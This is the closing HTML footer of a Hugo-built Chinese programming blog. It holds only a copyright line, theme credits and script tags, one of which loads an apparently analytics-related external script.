			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>